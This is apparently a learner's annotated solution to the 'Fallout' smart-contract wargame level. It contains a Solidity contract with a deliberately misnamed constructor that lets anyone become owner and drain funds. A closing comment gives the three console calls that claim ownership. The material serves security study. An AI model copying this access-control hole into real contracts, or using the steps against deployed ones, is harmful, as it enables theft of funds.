// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; //It should be 0.6.0 without ^

import 'openzeppelin-contracts-06/math/SafeMath.sol'; //OpenZeppelin is a library for secure smart contract development. SafeMath.sol is for secure math operations.

contract Fallout {

  /* State Variable */
  using SafeMath for uint256; // using safemath for this specific datatype (uint256)
  mapping (address => uint) allocations; // mapping address to how much its allocations
  address payable public owner; // payable means we probably can withdraw or transfer to this variable (owner)


  /* constructor */ 
  function Fal1out() public payable { 
    owner = msg.sender;
    allocations[owner] = msg.value; 
  }
  /* This is a contructor, but on solidity version before 0.4.22, there is no "contructor". 
  The constructor is marked when a function name is same as the contract.
  And in this fallout, there is a typo or misnaming of the constructor that did not match the name of the contruct.
  So the constructor are just a function, that anyone can call it.
  And in this Fal1out function, whoever call this function will be the owner. 


  /* modifier */ 
  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable { // Allocate here
    allocations[msg.sender] = allocations[msg.sender].add(msg.value); 
  }

  function sendAllocation(address payable allocator) public { //send value that has been allocated
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner { //collect allocations (only owner)
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) { //checking the balance of allocator
    return allocations[allocator];
  }
}

/* Solution 
Objective : Claim the ownership
1. Check the contract owner first "await contract.owner()" it should be 0x000000000000000000000000
2. Just simply call the fal1out function "await contract.Fal1out()"
3. And we successfully be the owner "await contract.owner()"
*/